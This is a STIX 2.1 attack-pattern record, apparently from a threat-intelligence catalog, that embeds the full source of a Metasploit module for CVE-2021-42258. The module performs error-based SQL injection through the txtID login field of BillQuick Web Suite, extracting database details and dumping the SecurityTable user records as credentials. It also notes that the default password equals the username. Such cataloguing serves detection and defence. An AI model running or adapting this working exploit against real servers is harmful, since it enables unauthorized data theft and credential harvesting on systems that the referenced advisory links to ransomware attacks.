{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--94988681-dbc3-45b0-996d-99a8136991a3",
    "created": "2024-08-14T16:31:56.262965Z",
    "modified": "2024-08-14T16:31:56.262969Z",
    "name": "BillQuick Web Suite txtID SQLi",
    "description": " This module exploits a SQL injection vulnerability in BillQUick Web Suite prior to version 22.0.9.1. The application is .net based, and the database is required to be MSSQL.  Luckily the website gives error based SQLi messages, so it is trivial to pull data from the database.  However the webapp uses an unknown password security algorithm.  This vulnerability does not seem to support stacked queries. This module pulls the database name, banner, user, hostname, and the SecurityTable (user table).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/billquick_txtid_sqli.rb",
            "external_id": "billquick_txtid_sqli.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.huntress.com/blog/threat-advisory-hackers-are-exploiting-a-vulnerability-in-popular-billing-software-to-deploy-ransomware"
        },
        {
            "source_name": "reference",
            "url": "http://billquick.net/download/Support_Download/BQWS2021Upgrade/WebSuite2021LogFile_9_1.pdf"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-42258"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::SQLi\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'BillQuick Web Suite txtID SQLi',\n        'Description' => %q{\n          This module exploits a SQL injection vulnerability in BillQUick Web Suite prior to version 22.0.9.1.\n          The application is .net based, and the database is required to be MSSQL.  Luckily the website gives\n          error based SQLi messages, so it is trivial to pull data from the database.  However the webapp\n          uses an unknown password security algorithm.  This vulnerability does not seem to support stacked\n          queries.\n          This module pulls the database name, banner, user, hostname, and the SecurityTable (user table).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Caleb Stewart <caleb.stewart94[at]gmail.com>' # original PoC, analysis\n        ],\n        'References' => [\n          ['URL', 'https://www.huntress.com/blog/threat-advisory-hackers-are-exploiting-a-vulnerability-in-popular-billing-software-to-deploy-ransomware'],\n          ['URL', 'http://billquick.net/download/Support_Download/BQWS2021Upgrade/WebSuite2021LogFile_9_1.pdf'],\n          ['CVE', '2021-42258']\n        ],\n        'DefaultOptions' => {\n          'HttpClientTimeout' => 15 # The server tends to be super slow, so allow 15sec per request\n        },\n        'DisclosureDate' => '2021-10-22',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [ true, 'The URI of BillQuick Web Suite', '/ws2020/'])\n      ], self.class\n    )\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, 'default.aspx'),\n        'method' => 'GET'\n      }, datastore['HttpClientTimeout'])\n      return Exploit::CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") if res.nil?\n      return Exploit::CheckCode::Safe(\"#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}\") if res.code != 200\n\n      %r{Version: (?<version>\\d{1,2}\\.\\d{1,2}\\.\\d{1,2})\\.\\d{1,2}</span>} =~ res.body\n\n      if version && Rex::Version.new(version) <= Rex::Version.new('22.0.9.1')\n        return Exploit::CheckCode::Appears(\"Version Detected: #{version}\")\n      end\n    rescue ::Rex::ConnectionError\n      return Exploit::CheckCode::Unknown(\"#{peer} - Could not connect to the web service\")\n    end\n    Exploit::CheckCode::Safe(\"Unexploitable Version: #{version}\")\n  end\n\n  def rand_chars(len = 6)\n    Rex::Text.rand_text_alpha(len)\n  end\n\n  def error_info(body)\n    body[/BQEShowModalAlert\\('Information','([^']+)/, 1]\n  end\n\n  def inject(content, state, generator, validation)\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'default.aspx'),\n      'method' => 'POST',\n      'vars_post' => {\n        '__VIEWSTATE' => state,\n        '__VIEWSTATEGENERATOR' => generator,\n        '__EVENTVALIDATION' => validation,\n        '__EVENTTARGET' => 'cmdOK',\n        '__EVENTARGUMENT' => '',\n        'txtID' => content,\n        'txtPW' => '',\n        'hdnClientDPI' => '96'\n      }\n    }, datastore['HttpClientTimeout'])\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}\") if res.code != 200\n    res.body\n  end\n\n  def run\n    vprint_status('Getting Variables')\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'default.aspx'),\n      'method' => 'GET'\n    }, datastore['HttpClientTimeout'])\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}\") if res.code != 200\n\n    /id=\"__VIEWSTATE\" value=\"(?<viewstate>[^\"]+)/ =~ res.body\n    /id=\"__VIEWSTATEGENERATOR\" value=\"(?<viewstategenerator>[^\"]+)/ =~ res.body\n    /id=\"__EVENTVALIDATION\" value=\"(?<eventvalidation>[^\"]+)/ =~ res.body\n    unless viewstate && viewstategenerator && eventvalidation\n      fail_with(Failure::UnexpectedReply, 'Unable to find viewstate, viewstategenerator, and eventvalidation values.')\n    end\n    vprint_status(\"VIEWSTATE: #{viewstate}\")\n    vprint_status(\"VIEWSTATEGENERATOR: #{viewstategenerator}\")\n    vprint_status(\"EVENTVALIDATION: #{eventvalidation}\")\n\n    header = rand_chars\n    footer = rand_chars\n\n    service = {\n      address: rhost,\n      port: datastore['RPORT'],\n      protocol: 'tcp',\n      service_name: 'BillQuick Web Suite',\n      workspace_id: myworkspace_id\n    }\n    report_service(service)\n\n    sqli = create_sqli(dbms: Msf::Exploit::SQLi::Mssqli::Common, opts: { safe: true, encoder: { encode: \"'#{header}'+^DATA^+'#{footer}'\", decode: ->(x) { x[/#{header}(.+?)#{footer}/mi, 1] } } }) do |payload|\n      int = Rex::Text.rand_text_numeric(4)\n      res = inject(\"'+(select '' where #{int} in (#{payload}))+'\", viewstate, viewstategenerator, eventvalidation)\n      err_info = error_info(res)\n      print_error('Unexpected output from the server') if err_info.nil?\n      err_info[/\\\\u0027(.+?)\\\\u0027/m, 1]\n    end\n\n    # all inject strings taken from sqlmap runs, using error page method\n    database = sqli.current_database\n    print_good(\"Current Database: #{database}\")\n    report_note(host: rhost, port: rport, type: 'database', data: database)\n\n    banner = sqli.version.gsub('\\n', \"\\n\").gsub('\\t', \"\\t\")\n    print_good(\"Banner: #{banner}\")\n\n    user = sqli.current_user\n    print_good(\"DB User: #{user}\")\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: user,\n      private_type: :nonreplayable_hash,\n      private_data: ''\n    }.merge(service)\n    create_credential(credential_data)\n\n    hostname = sqli.hostname\n    print_good(\"Hostname: #{hostname}\")\n\n    report_host(host: rhost, name: hostname, info: banner, os_name: OperatingSystems::WINDOWS)\n\n    sec_table = sqli.dump_table_fields(\"#{database}.dbo.SecurityTable\", %w[EmployeeID Settings], 'ModuleID=0')\n\n    table = Rex::Text::Table.new(\n      'Header' => \"#{database}.dbo.SecurityTable\",\n      'Indent' => 1,\n      'SortIndex' => -1,\n      'Columns' =>\n      [\n        'EmployeeID',\n        'Settings',\n      ]\n    )\n\n    sec_table.each do |(username, settings)|\n      table << [username, settings]\n      credential_data = {\n        origin_type: :service,\n        module_fullname: fullname,\n        username: username,\n        private_type: :nonreplayable_hash, # prob encrypted not hash, so lies.\n        private_data: settings.split('|').first\n      }.merge(service)\n      create_credential(credential_data)\n    end\n    print_good(table.to_s)\n    print_status('Default password is the username.')\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-10-22"
}